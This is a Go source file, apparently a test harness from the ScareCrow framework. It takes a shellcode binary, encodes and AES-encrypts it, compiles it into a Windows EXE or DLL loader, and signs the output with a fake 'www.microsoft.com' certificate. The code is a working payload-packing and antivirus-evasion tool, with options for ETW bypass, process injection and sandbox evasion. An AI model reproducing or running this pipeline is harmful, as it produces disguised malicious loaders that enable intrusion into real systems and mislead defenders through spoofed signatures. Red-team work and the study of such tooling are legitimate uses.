package main

import (
	"ScareCrow/Cryptor"
	Base62 "ScareCrow/Encoder"
	"ScareCrow/Loader"
	"ScareCrow/limelighter"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
)

type FlagOptions struct {
	outFile          string
	inputFile        string
	URL              string
	LoaderType       string
	CommandLoader    string
	domain           string
	password         string
	valid            string
	configfile       string
	ProcessInjection string
	ETW              bool
	console          bool
	refresher        bool
	sandbox          bool
}

func execute(opt *FlagOptions, name string) string {
	bin, _ := exec.LookPath("env")
	var compiledname string
	var cmd *exec.Cmd
	if opt.configfile != "" {
		oldname := name
		name = limelighter.FileProperties(name, opt.configfile)
		cmd = exec.Command("mv", "../"+oldname+"", "../"+name+"")
		err := cmd.Run()
		if err != nil {
			fmt.Printf("error")
		}
	} else {
		name = limelighter.FileProperties(name, opt.configfile)
	}
	if opt.LoaderType == "binary" {
		cmd = exec.Command(bin, "GOROOT_FINAL=/dev/null", "GOOS=windows", "GOARCH=amd64", "go", "build", "-a", "-trimpath", "-ldflags", "-s -w", "-o", ""+name+".exe")
	} else {
		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "go", "build", "-a", "-trimpath", "-ldflags", "-w -s", "-o", ""+name+".dll", "-buildmode=c-shared")
	}
	fmt.Println("[*] Compiling Payload")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("%s: %s\n", err, stderr.String())
	}
	if opt.LoaderType == "binary" {
		compiledname = name + ".exe"
	} else {
		compiledname = name + ".dll"
	}
	fmt.Println("[+] Payload Compiled")
	limelighter.Signer(opt.domain, opt.password, opt.valid, compiledname)
	return name
}

func main() {

	cmdArgs := os.Args[1:]

	if len(cmdArgs) < 1 {
		fmt.Println("USAGE: <path_to_bin>")
		return
	}

	// load our binary file
	pathToBin := cmdArgs[0]

	// convert to binary
	src, _ := ioutil.ReadFile(pathToBin)

	// hex encode
	dst := make([]byte, hex.EncodedLen(len(src)))
	hex.Encode(dst, src)

	// base 64 encode hex and convert to bytes
	r := base64.StdEncoding.EncodeToString(dst)
	rawbyte := []byte(r)

	// generate AES encryption key and init vector
	key := Cryptor.RandomBuffer(32)
	iv := Cryptor.RandomBuffer(16)

	// create new cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("A fatal error has occurred while creating the block cipher")
		log.Fatal(err)
	}

	paddedInput, err := Cryptor.Pkcs7Pad([]byte(rawbyte), aes.BlockSize)
	if err != nil {
		fmt.Println("A fatal error has occurred while padding the cipher")
		log.Fatal(err)
	}

	// Encrypting the bin with AES Encryption
	fmt.Println("Encrypting bin file with AES Encryption")
	cipherText := make([]byte, len(paddedInput))
	ciphermode := cipher.NewCBCEncrypter(block, iv)
	ciphermode.CryptBlocks(cipherText, paddedInput)

	// Encoding the ciphertext, key, and init vect to base64
	b64ciphertext := base64.StdEncoding.EncodeToString(cipherText)
	b64key := base64.StdEncoding.EncodeToString(key)
	b64iv := base64.StdEncoding.EncodeToString(iv)

	// create a fake opt struct to pass to execute
	fakeOpt := FlagOptions{
		outFile:          "testfile",
		inputFile:        pathToBin,
		console:          false,
		LoaderType:       "control",
		refresher:        false,
		URL:              "",
		CommandLoader:    "",
		domain:           "www.microsoft.com",
		password:         "",
		ETW:              false,
		ProcessInjection: "",
		valid:            "",
		configfile:       "",
		sandbox:          false}

	// Loads our bin file and sets the compile to control with all disabled feature flags
	// TODO : Load via struct
	name, _ := Loader.CompileFile(b64ciphertext, b64key, b64iv, fakeOpt.LoaderType, fakeOpt.outFile, fakeOpt.refresher, fakeOpt.console, fakeOpt.sandbox, fakeOpt.ETW, fakeOpt.ProcessInjection, false)

	// execute requires the pointer for opt
	name = execute(&fakeOpt, name)

	// base62 test
	fmt.Println(Base62.Encode("SIMPLE"))
	encoded := Base62.Encode("SIMPLE")
	fmt.Println(Base62.Decode(encoded))

	// Loader.CompileLoader(fakeOpt.LoaderType, fakeOpt.outFile, filename, name, fakeOpt.CommandLoader, fakeOpt.URL, fakeOpt.sandbox)
}
